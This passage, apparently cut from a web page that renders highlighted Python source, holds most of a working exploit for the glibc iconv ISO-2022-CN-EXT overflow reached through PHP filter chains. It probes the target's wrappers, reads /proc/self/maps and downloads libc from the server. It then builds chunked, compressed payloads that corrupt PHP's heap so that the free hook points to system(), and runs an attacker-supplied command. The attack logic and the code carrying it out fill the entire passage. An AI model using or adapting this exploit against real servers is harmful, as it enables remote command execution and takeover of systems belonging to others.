class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.heap, <span class="hljs-number">16</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vulnerable</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span><br><span class="hljs-string">        wrappers and filters that the exploit needs.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># --------</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_iconv</span>(<span class="hljs-params">filters: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.iconv(filters, content)<br>            <span class="hljs-keyword">except</span> ConnectionError:<br>                failure(<span class="hljs-string">&quot;Target not [b]reachable[/] ?&quot;</span>)<br>        <span class="hljs-comment"># --------</span><br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_download</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br>            <span class="hljs-keyword">except</span> ConnectionError:<br>                failure(<span class="hljs-string">&quot;Target not [b]reachable[/] ?&quot;</span>)<br>            <br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_token</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span>, filters: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>        <span class="hljs-comment"># def check_token(text: str, path: str) -&gt; bool:</span><br>            <span class="hljs-comment"># result = safe_download(path)</span><br>            result = safe_iconv(filters, content).content<br>            <span class="hljs-keyword">return</span> text.encode() == result<br><br>        text = tf.random.string(<span class="hljs-number">50</span>).encode()<br>        <span class="hljs-comment"># base64 = b64(text, misalign=True).decode()</span><br>        <span class="hljs-comment"># path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;</span><br>        <br>        <span class="hljs-comment"># result = safe_download(path)</span><br>        result = safe_iconv(<span class="hljs-string">&quot;&quot;</span>, text).content<br>        <br>        <span class="hljs-keyword">if</span> text <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            msg_failure(<span class="hljs-string">&quot;Remote.download did not return the test string&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Expected test string: <span class="hljs-subst">&#123;text&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Got: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            failure(<span class="hljs-string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]data://[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        <span class="hljs-comment"># base64 = b64(text.encode(), misalign=True).decode()</span><br>        <span class="hljs-comment"># path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;</span><br>        <span class="hljs-comment"># if not check_token(text, path):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, <span class="hljs-string">&quot;/&quot;</span>, text):<br>            failure(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        <span class="hljs-comment"># base64 = b64(compress(text.encode()), misalign=True).decode()</span><br>        <span class="hljs-comment"># path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;</span><br><br>        <span class="hljs-comment"># if not check_token(text, path):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, <span class="hljs-string">&quot;/zlib.inflate&quot;</span>, compress(text.encode())):<br>            failure(<span class="hljs-string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)<br><br>        msg_success(<span class="hljs-string">&quot;Exploit preconditions are satisfied&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">with</span> msg_status(<span class="hljs-string">f&quot;Downloading [i]<span class="hljs-subst">&#123;path&#125;</span>[/]...&quot;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_regions</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">list</span>[Region]:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span><br>        maps = <span class="hljs-variable language_">self</span>.get_file(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>)<br>        maps = maps.decode()<br>        PATTERN = re.<span class="hljs-built_in">compile</span>(<br>            <span class="hljs-string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="hljs-string">r&quot;.*&quot;</span> <span class="hljs-string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="hljs-string">r&quot;(.*)&quot;</span><br>        )<br>        regions = []<br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> table.split(maps, strip=<span class="hljs-literal">True</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> := PATTERN.<span class="hljs-keyword">match</span>(region):<br>                start = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>)<br>                stop = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>                permissions = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)<br>                path = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;[&quot;</span> <span class="hljs-keyword">in</span> path:<br>                    path = path.rsplit(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>]<br>                <span class="hljs-keyword">else</span>:<br>                    path = <span class="hljs-string">&quot;&quot;</span><br>                current = Region(start, stop, permissions, path)<br>                regions.append(current)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(maps)<br>                failure(<span class="hljs-string">&quot;Unable to parse memory mappings&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.log.info(<span class="hljs-string">f&quot;Got <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> regions<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_symbols_and_addresses</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span><br>        regions = <span class="hljs-variable language_">self</span>.get_regions()<br><br>        LIBC_FILE = <span class="hljs-string">&quot;/dev/shm/cnext-libc&quot;</span><br><br>        <span class="hljs-comment"># PHP&#x27;s heap</span><br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>] = <span class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.find_main_heap(regions)<br><br>        <span class="hljs-comment"># Libc</span><br><br>        libc = <span class="hljs-variable language_">self</span>._get_region(regions, <span class="hljs-string">&quot;libc-&quot;</span>, <span class="hljs-string">&quot;libc.so&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.download_file(libc.path, LIBC_FILE)<br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="hljs-literal">False</span>)<br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>].address = libc.start<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_region</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region], *names: <span class="hljs-built_in">str</span></span>) -&gt; Region:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> regions:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(name <span class="hljs-keyword">in</span> region.path <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names):<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            failure(<span class="hljs-string">&quot;Unable to locate region&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> region<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">self, remote_path: <span class="hljs-built_in">str</span>, local_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span><br>        data = <span class="hljs-variable language_">self</span>.get_file(remote_path)<br>        Path(local_path).write(data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_main_heap</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region]</span>) -&gt; Region:<br>        <span class="hljs-comment"># Any anonymous RW region with a size superior to the base heap size is a</span><br>        <span class="hljs-comment"># candidate. The heap is at the bottom of the region.</span><br>        heaps = [<br>            region.stop - HEAP_SIZE + <span class="hljs-number">0x40</span><br>            <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(regions)<br>            <span class="hljs-keyword">if</span> region.permissions == <span class="hljs-string">&quot;rw-p&quot;</span><br>            <span class="hljs-keyword">and</span> region.size &gt;= HEAP_SIZE<br>            <span class="hljs-keyword">and</span> region.stop &amp; (HEAP_SIZE-<span class="hljs-number">1</span>) == <span class="hljs-number">0</span><br>            <span class="hljs-keyword">and</span> region.path <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;[anon:zend_alloc]&quot;</span>)<br>        ]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> heaps:<br>            failure(<span class="hljs-string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)<br><br>        first = heaps[<span class="hljs-number">0</span>]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(heaps) &gt; <span class="hljs-number">1</span>:<br>            heaps = <span class="hljs-string">&quot;, &quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">hex</span>, heaps))<br>            msg_info(<span class="hljs-string">f&quot;Potential heaps: [i]<span class="hljs-subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            msg_info(<span class="hljs-string">f&quot;Using [i]<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> first<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.check_vulnerable()<br>        <span class="hljs-variable language_">self</span>.get_symbols_and_addresses()<br>        <span class="hljs-variable language_">self</span>.exploit()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit_path</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the</span><br><span class="hljs-string">        other. Processing generally involves making some kind of operation either</span><br><span class="hljs-string">        on the chunk or in a destination chunk of the same size. Each operation is</span><br><span class="hljs-string">        applied on every single chunk; you cannot make PHP apply iconv on the first 10</span><br><span class="hljs-string">        chunks and leave the rest in place. That&#x27;s where the difficulties come from.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Keep in mind that we know the address of the main heap, and the libraries.</span><br><span class="hljs-string">        ASLR/PIE do not matter here.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The idea is to use the bug to make the freelist for chunks of size 0x100 point</span><br><span class="hljs-string">        lower. For instance, we have the following free list:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00</span><br><span class="hljs-string"></span><br><span class="hljs-string">        By triggering the bug from chunk ..900, we get:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???</span><br><span class="hljs-string"></span><br><span class="hljs-string">        That&#x27;s step 3.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, in order to control the free list, and make it point whereever we want,</span><br><span class="hljs-string">        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,</span><br><span class="hljs-string">        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.</span><br><span class="hljs-string">        That&#x27;s step 2.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have</span><br><span class="hljs-string">        a problem: after step2 has been processed, the free list goes bottom-up, like:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900</span><br><span class="hljs-string"></span><br><span class="hljs-string">        We need to go the other way around. That&#x27;s why we have step 1: it just allocates</span><br><span class="hljs-string">        chunks. When they get freed, they reverse the free list. Now step2 allocates in</span><br><span class="hljs-string">        reverse order, and therefore after step2, chunks are in the correct order.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Another problem comes up.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.</span><br><span class="hljs-string">        Since step2 creates chunks that contain pointers and pointers are generally not</span><br><span class="hljs-string">        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.</span><br><span class="hljs-string">        To avoid this, we put the chunks in step2 at the very end of the chain, and</span><br><span class="hljs-string">        prefix them with `0\n`. When dechunked (right before the iconv), they will</span><br><span class="hljs-string">        &quot;disappear&quot; from the chain, preserving them from the character set conversion</span><br><span class="hljs-string">        and saving us from an unwanted processing error that would stop the processing</span><br><span class="hljs-string">        chain.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We</span><br><span class="hljs-string">        don&#x27;t know the precise layout of the heap, but we know that at the top of the</span><br><span class="hljs-string">        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.</span><br><span class="hljs-string">        Its free_slot[] array contains a pointer to each free list. By overwriting it,</span><br><span class="hljs-string">        we can make PHP allocate chunks whereever we want. In addition, its custom_heap</span><br><span class="hljs-string">        field contains pointers to hook functions for emalloc, efree, and erealloc</span><br><span class="hljs-string">        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and</span><br><span class="hljs-string">        then overwrite the use_custom_heap flag to make PHP use these function pointers</span><br><span class="hljs-string">        instead. We can now do our favorite CTF technique and get a call to</span><br><span class="hljs-string">        system(&lt;chunk&gt;).</span><br><span class="hljs-string">        We make sure that the &quot;system&quot; command kills the current process to avoid other</span><br><span class="hljs-string">        system() calls with random chunk data, leading to undefined behaviour.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the</span><br><span class="hljs-string">        process is in a random state, we still get contiguous, in order chunks for our</span><br><span class="hljs-string">        exploit.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Therefore, the whole process described here CANNOT crash. Everything falls</span><br><span class="hljs-string">        perfectly in place, and nothing can get in the middle of our allocations.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br>        LIBC = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>]<br>        ADDR_EMALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_malloc&quot;</span>]<br>        ADDR_EFREE = LIBC.symbols[<span class="hljs-string">&quot;__libc_system&quot;</span>]<br>        ADDR_EREALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_realloc&quot;</span>]<br><br>        ADDR_HEAP = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>]<br>        ADDR_FREE_SLOT = ADDR_HEAP + <span class="hljs-number">0x20</span><br>        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="hljs-number">0x0168</span><br><br>        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="hljs-number">0x10</span><br><br>        CS = <span class="hljs-number">0x100</span><br><br>        <span class="hljs-comment"># Pad needs to stay at size 0x100 at every step</span><br>        pad_size = CS - <span class="hljs-number">0x18</span><br>        pad = <span class="hljs-string">b&quot;\x00&quot;</span> * pad_size<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = compressed_bucket(pad)<br><br>        step1_size = <span class="hljs-number">1</span><br>        step1 = <span class="hljs-string">b&quot;\x00&quot;</span> * step1_size<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1, CS)<br>        step1 = compressed_bucket(step1)<br><br>        <span class="hljs-comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span><br>        <span class="hljs-comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span><br><br>        step2_size = <span class="hljs-number">0x48</span><br>        step2 = <span class="hljs-string">b&quot;\x00&quot;</span> * (step2_size + <span class="hljs-number">8</span>)<br>        step2 = chunked_chunk(step2, CS)<br>        step2 = chunked_chunk(step2)<br>        step2 = compressed_bucket(step2)<br><br>        step2_write_ptr = <span class="hljs-string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="hljs-string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr)<br>        step2_write_ptr = compressed_bucket(step2_write_ptr)<br><br>        step3_size = CS<br><br>        step3 = <span class="hljs-string">b&quot;\x00&quot;</span> * step3_size<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3) == CS<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = compressed_bucket(step3)<br><br>        step3_overflow = <span class="hljs-string">b&quot;\x00&quot;</span> * (step3_size - <span class="hljs-built_in">len</span>(BUG)) + BUG<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3_overflow) == CS<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = compressed_bucket(step3_overflow)<br><br>        step4_size = CS<br>        step4 = <span class="hljs-string">b&quot;=00&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span> * (step4_size - <span class="hljs-number">1</span>)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = compressed_bucket(step4)<br><br>        <span class="hljs-comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span><br>        <span class="hljs-comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span><br>        step4_pwn = ptr_bucket(<br>            <span class="hljs-number">0x200000</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-comment"># free_slot</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_CUSTOM_HEAP,  <span class="hljs-comment"># 0x18</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_HEAP,  <span class="hljs-comment"># 0x140</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            size=CS,<br>        )<br><br>        step4_custom_heap = ptr_bucket(<br>            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="hljs-number">0x18</span><br>        )<br><br>        step4_use_custom_heap_size = <span class="hljs-number">0x140</span><br><br>        COMMAND = <span class="hljs-variable language_">self</span>.command<br>        COMMAND = <span class="hljs-string">f&quot;kill -9 $PPID; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.sleep:<br>            COMMAND = <span class="hljs-string">f&quot;sleep <span class="hljs-subst">&#123;self.sleep&#125;</span>; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        COMMAND = COMMAND.encode() + <span class="hljs-string">b&quot;\x00&quot;</span><br><br>        <span class="hljs-keyword">assert</span> (<br>            <span class="hljs-built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size<br>        ), <span class="hljs-string">f&quot;Command too big (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span><br>        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>        step4_use_custom_heap = COMMAND<br>        step4_use_custom_heap = qpe(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)<br><br>        pages = (<br>            step4 * <span class="hljs-number">3</span><br>            + step4_pwn<br>            + step4_custom_heap<br>            + step4_use_custom_heap<br>            + step3_overflow<br>            + pad * <span class="hljs-variable language_">self</span>.pad<br>            + step1 * <span class="hljs-number">3</span><br>            + step2_write_ptr<br>            + step2 * <span class="hljs-number">2</span><br>        )<br><br>        resource = compress(compress(pages))<br>        <span class="hljs-comment"># resource = b64(resource)</span><br>        <span class="hljs-comment"># resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;</span><br><br>        filters = [<br>            <span class="hljs-comment"># Create buckets</span><br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 0: Setup heap</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.L1.L1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 1: Reverse FL order</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.L1.L1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 2: Put fake pointer and make FL order back to normal</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.L1.L1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 3: Trigger overflow</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span><br>            <span class="hljs-string">&quot;convert.quoted-printable-decode&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.L1.L1&quot;</span>,<br>        ]<br>        filters = <span class="hljs-string">&quot;|&quot;</span>.join(filters)<br>        path = <span class="hljs-string">f&quot;php://filter/read=<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;resource&#125;</span>&quot;</span><br><br>        <span class="hljs-comment"># return path</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;/read=<span class="hljs-subst">&#123;filters&#125;</span>&quot;</span>, resource<br><br><span class="hljs-meta">    @inform(<span class="hljs-params"><span class="hljs-string">&quot;Triggering...&quot;</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># path = self.build_exploit_path()</span><br>        filters, content = <span class="hljs-variable language_">self</span>.build_exploit_path()<br>        start = time.time()<br><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># self.remote.send(path)</span><br>            <span class="hljs-variable language_">self</span>.remote.iconv(filters, content)<br>        <span class="hljs-keyword">except</span> (ConnectionError, ChunkedEncodingError):<br>            <span class="hljs-keyword">pass</span><br>        <br>        msg_print()<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.sleep:<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> start + <span class="hljs-variable language_">self</span>.sleep &lt;= time.time():<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span><br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)<br>        <br>        msg_print()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">data</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># Remove 2-byte header and 4-byte checksum</span><br>    <span class="hljs-keyword">return</span> zlib.compress(data, <span class="hljs-number">9</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">4</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b64</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, misalign=<span class="hljs-literal">True</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    payload = base64.encode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> misalign <span class="hljs-keyword">and</span> payload.endswith(<span class="hljs-string">&quot;=&quot;</span>):<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Misaligned: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload.encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compressed_bucket</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> chunked_chunk(data, <span class="hljs-number">0x8000</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">qpe</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">f&quot;=<span 